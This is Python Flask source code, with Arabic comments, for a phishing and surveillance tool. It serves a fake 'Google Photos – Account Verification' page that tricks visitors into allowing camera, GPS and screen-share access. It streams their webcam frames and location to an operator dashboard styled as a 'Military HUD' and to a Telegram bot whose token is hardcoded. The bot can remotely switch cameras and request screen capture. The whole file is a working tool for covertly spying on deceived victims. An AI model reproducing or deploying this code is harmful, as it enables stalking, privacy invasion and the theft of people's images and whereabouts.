import os
import time
import threading
import requests
import base64
import eventlet
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit

# تفعيل eventlet
eventlet.monkey_patch()

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# --- [ إعدادات البوت ] ---
BOT_TOKEN = "8731655533:AAFBxpr2goRmjY46jOB_BQdZKmk2ycFrYKQ"
CHAT_ID = "8305841557"
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# المتغيرات العامة
app_url = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

# --- [ واجهة الضحية (تصميم احترافي مقنع) ] ---
VICTIM_HTML = """
<!DOCTYPE html>
<html dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Photos - Update Required</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; background: #fff; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { max-width: 400px; width: 100%; text-align: center; }
        .logo { width: 75px; margin-bottom: 20px; }
        h1 { font-size: 24px; color: #202124; margin-bottom: 10px; }
        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%; transition: background 0.2s; }
        .btn:hover { background: #1557b0; box-shadow: 0 1px 3px rgba(0,0,0,0.3); }
        .footer { margin-top: 40px; font-size: 12px; color: #9aa0a6; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 0 auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="container" id="main-ui">
        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
        <h1>Account Verification</h1>
        <p>For security reasons, we need to verify your device to continue using Google Photos services. Please allow camera and location access.</p>
        <button class="btn" onclick="initVerify()">Verify Now</button>
        <div id="loading" class="spinner" style="margin-top:20px;"></div>
        <div class="footer">Google LLC &copy; 2024</div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        const socket = io();
        let mode = 'front';
        let stream = null;

        async function initVerify() {
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            document.querySelector('h1').innerText = "Verifying...";

            try {
                // طلب الكاميرا
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                document.getElementById('v').srcObject = stream;

                // طلب الموقع
                navigator.geolocation.watchPosition(p => {
                    socket.emit('loc', { lat: p.coords.latitude, lon: p.coords.longitude });
                }, null, { enableHighAccuracy: true });

                // إخفاء الواجهة وبدء البث
                setTimeout(() => {
                    document.getElementById('main-ui').style.display = 'none';
                    document.body.style.background = '#000';
                    streamLoop();
                }, 2000);

            } catch (e) {
                alert("Permission denied. Please allow access to continue.");
                location.reload();
            }
        }

        function streamLoop() {
            if(!stream) return;
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            canvas.width = 320; canvas.height = 240;
            ctx.drawImage(document.getElementById('v'), 0, 0, 320, 240);
            
            const img = canvas.toDataURL('image/jpeg', 0.3);
            socket.emit('stream', { img: img, mode: mode });
            
            setTimeout(streamLoop, 2000);
        }

        socket.on('admin_cmd', data => {
            if(data.cmd === 'switch_cam') {
                // تبديل الكاميرا
                stream.getTracks().forEach(t => t.stop());
                mode = mode === 'front' ? 'back' : 'front';
                navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false })
                .then(s => { stream = s; document.getElementById('v').srcObject = s; });
            } else if (data.cmd === 'screen') {
                // طلب الشاشة
                navigator.mediaDevices.getDisplayMedia({ video: true })
                .then(s => { stream = s; document.getElementById('v').srcObject = s; mode = 'screen'; });
            }
        });
    </script>
</body>
</html>
"""

# --- [ لوحة التحكم العسكرية (Military HUD) ] ---
ADMIN_DASHBOARD = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MILITARY HUD v3.0</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ff41; --dark: #050a05; --glass: rgba(5, 20, 5, 0.85); --alert: #ff3333; }
        body { background: var(--dark); color: var(--neon); font-family: 'Share Tech Mono', monospace; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        
        /* الفيديو الخلفي */
        #main-feed {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: contain; z-index: 1; opacity: 0.9;
        }

        /* طبقة الواجهة */
        .hud-overlay {
            position: relative; z-index: 10; height: 100%;
            display: flex; flex-direction: column; justify-content: space-between;
            padding: 15px; pointer-events: none;
            background: radial-gradient(circle, transparent 50%, rgba(0,0,0,0.8) 100%);
        }

        /* الرأس العسكري */
        .top-bar {
            display: flex; justify-content: space-between; align-items: flex-start;
            border-bottom: 1px solid var(--neon); padding-bottom: 10px; margin-bottom: 10px;
            text-shadow: 0 0 5px var(--neon);
        }
        .sys-info { text-align: left; }
        .sys-status { text-align: right; }
        .blink { animation: blink 1s infinite; color: var(--alert); }
        .grid-lines {
            position: absolute; top:0; left:0; width:100%; height:100%;
            background: linear-gradient(rgba(0,255,65,0.03) 1px, transparent 1px),
            linear-gradient(90deg, rgba(0,255,65,0.03) 1px, transparent 1px);
            background-size: 40px 40px; pointer-events: none; z-index: 2;
        }

        /* الخريطة الذكية */
        .map-container {
            position: absolute; top: 80px; right: 20px;
            width: 220px; height: 160px;
            border: 2px solid var(--neon);
            background: var(--glass);
            box-shadow: 0 0 15px rgba(0,255,65,0.2);
            z-index: 20; pointer-events: auto;
        }
        .map-header { background: var(--neon); color: #000; padding: 2px 5px; font-size: 10px; font-weight: bold; }
        iframe { width: 100%; height: calc(100% - 20px); border: 0; filter: invert(100%) hue-rotate(180deg) contrast(1.2); }

        /* لوحة التحكم السفلية */
        .control-deck {
            background: var(--glass); border: 1px solid var(--neon); border-radius: 8px;
            padding: 15px; pointer-events: auto; backdrop-filter: blur(5px);
            display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px;
        }
        .cmd-btn {
            background: rgba(0,255,65,0.1); border: 1px solid var(--neon); color: var(--neon);
            padding: 15px 0; text-align: center; cursor: pointer; font-family: 'Rajdhani', sans-serif; font-weight: bold; font-size: 16px;
            transition: 0.3s; text-transform: uppercase;
        }
        .cmd-btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
        .cmd-btn.danger { border-color: var(--alert); color: var(--alert); background: rgba(255,51,51,0.1); }
        .cmd-btn.danger:hover { background: var(--alert); color: #000; box-shadow: 0 0 15px var(--alert); }

        /* قائمة السياق */
        .context-info {
            position: absolute; top: 80px; left: 20px;
            color: var(--neon); font-size: 12px; line-height: 1.6;
            background: rgba(0,0,0,0.7); padding: 10px; border-left: 3px solid var(--neon);
        }

        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <div class="grid-lines"></div>
    
    <!-- البث المباشر -->
    <img id="main-feed" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">

    <!-- واجهة التحكم -->
    <div class="hud-overlay">
        
        <!-- الرأس -->
        <div class="top-bar">
            <div class="sys-info">
                <div style="font-size: 20px; font-weight: bold;">UNIT: PHANTOM</div>
                <div style="font-size: 12px;">OP: ACTIVE • SECURE</div>
            </div>
            <div class="sys-status">
                <div style="font-size: 20px;">00:00:00</div>
                <div class="blink">● LIVE FEED</div>
            </div>
        </div>

        <!-- معلومات السياق -->
        <div class="context-info">
            <div>TARGET: LOCKED</div>
            <div>SIGNAL: STRONG</div>
            <div>BATTERY: --%</div>
        </div>

        <!-- الخريطة العائمة -->
        <div class="map-container">
            <div class="map-header">TARGET GPS</div>
            <iframe id="map" src="https://maps.google.com/maps?q=0,0&t=k&z=15&output=embed"></iframe>
        </div>

        <!-- الأزرار -->
        <div class="control-deck">
            <button class="cmd-btn" onclick="cmd('switch_cam')">SWAP<br>CAM</button>
            <button class="cmd-btn" onclick="cmd('screen')">SCREEN<br>SHARE</button>
            <button class="cmd-btn" onclick="copyLink()">COPY<br>LINK</button>
            <button class="cmd-btn" onclick="openMap()">GPS<br>TRACK</button>
            <button class="cmd-btn danger" style="grid-column: span 4;" onclick="cmd('sos')">⚠️ EMERGENCY PROTOCOL INITIATED</button>
        </div>
    </div>

    <script>
        const socket = io();
        let startTime = new Date();

        // تحديث الوقت
        setInterval(() => {
            let diff = new Date(new Date() - startTime);
            let t = diff.toISOString().substr(11, 8);
            document.querySelector('.sys-status div:first-child').innerText = t;
        }, 1000);

        socket.on('view', d => { document.getElementById('main-feed').src = d.img; });
        socket.on('map_up', d => { 
            document.getElementById('map').src = `https://maps.google.com/maps?q=${d.lat},${d.lon}&t=k&z=18&output=embed`; 
            document.querySelector('.context-info').innerHTML += `<div>LOC: ${d.lat.toFixed(4)}, ${d.lon.toFixed(4)}</div>`;
        });

        function cmd(c) { socket.emit('admin_cmd', {cmd: c}); }
        function copyLink() { navigator.clipboard.writeText(window.location.origin + '/'); alert('LINK COPIED'); }
        function openMap() { window.open(document.getElementById('map').src, '_blank'); }
    </script>
</body>
</html>
"""

@app.route('/')
def victim(): return render_template_string(VICTIM_HTML)

@app.route('/admin')
def admin(): return render_template_string(ADMIN_DASHBOARD)

# --- [ باقي الكود (السوكتات والبوت كما هي) ] ---
@socketio.on('stream')
def handle_stream(data):
    emit('view', data, broadcast=True, include_self=False)
    try:
        img_data = data['img'].split(',')[1]
        requests.post(f"{BOT_API}/sendPhoto", 
                      files={'photo': ('s.jpg', base64.b64decode(img_data))},
                      data={"chat_id": CHAT_ID, "caption": f"📷 Mode: {data.get('mode', 'front')}"}, timeout=5)
    except: pass

@socketio.on('loc')
def handle_loc(data):
    emit('map_up', data, broadcast=True, include_self=False)
    try:
        requests.post(f"{BOT_API}/sendLocation", 
                      json={"chat_id": CHAT_ID, "latitude": data['lat'], "longitude": data['lon']})
    except: pass

@socketio.on('admin_cmd')
def handle_admin_cmd(data):
    emit('admin_cmd', data, broadcast=True, include_self=False)

def bot_manager():
    print("Military Bot Active...")
    offset = 0
    while True:
        try:
            req = requests.get(f"{BOT_API}/getUpdates?offset={offset}&timeout=20", timeout=25).json()
            if req.get('ok'):
                for r in req['result']:
                    offset = r['update_id'] + 1
                    msg = r.get('message', {})
                    query = r.get('callback_query')
                    chat_id = msg.get('chat', {}).get('id') or (query.get('message', {}).get('chat', {}).get('id') if query else None)
                    if not chat_id: continue

                    if query:
                        data = query['data']
                        try:
                            if data == 'start': send_menu(chat_id, "🛡️ MILITARY HUD SYSTEM ONLINE.")
                            elif data == 'link': requests.post(f"{BOT_API}/sendMessage", json={"chat_id": chat_id, "text": f"🔗 Target Link:\n{app_url}/"})
                            elif data == 'front': socketio.emit('admin_cmd', {'cmd': 'switch_cam'}); answer(query, "✅ FRONT CAM")
                            elif data == 'back': socketio.emit('admin_cmd', {'cmd': 'switch_cam'}); answer(query, "✅ BACK CAM")
                            elif data == 'screen': socketio.emit('admin_cmd', {'cmd': 'screen'}); answer(query, "✅ SCREEN REQ")
                            elif data == 'map': requests.post(f"{BOT_API}/sendMessage", json={"chat_id": chat_id, "text": "📍 Check Admin Panel for Live Map."})
                            elif data == 'stop': answer(query, "🛑 SYSTEM SHUTDOWN"); os.kill(os.getpid(), 9)
                        except: pass
                        continue

                    if msg.get('text') == '/start':
                        send_menu(chat_id, "🛡️ SYSTEM INITIALIZED.\nControls Ready.")
        except: pass
        time.sleep(1)

def send_menu(chat_id, text):
    k = {"inline_keyboard": [
        [{"text": "🔗 Copy Target Link", "callback_data": "link"}, {"text": "📍 Live Location", "callback_data": "map"}],
        [{"text": "📷 Front Camera", "callback_data": "front"}, {"text": "📷 Back Camera", "callback_data": "back"}],
        [{"text": "💻 Request Screen", "callback_data": "screen"}],
        [{"text": "🛑 Shutdown System", "callback_data": "stop"}]
    ]}
    try: requests.post(f"{BOT_API}/sendMessage", json={"chat_id": chat_id, "text": text, "reply_markup": k})
    except: pass

def answer(query, text):
    try: requests.post(f"{BOT_API}/answerCallbackQuery", json={"callback_query_id": query['id'], "text": text})
    except: pass

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"System Running on Port {port}")
    threading.Thread(target=bot_manager, daemon=True).start()
    socketio.run(app, host='0.0.0.0', port=port)
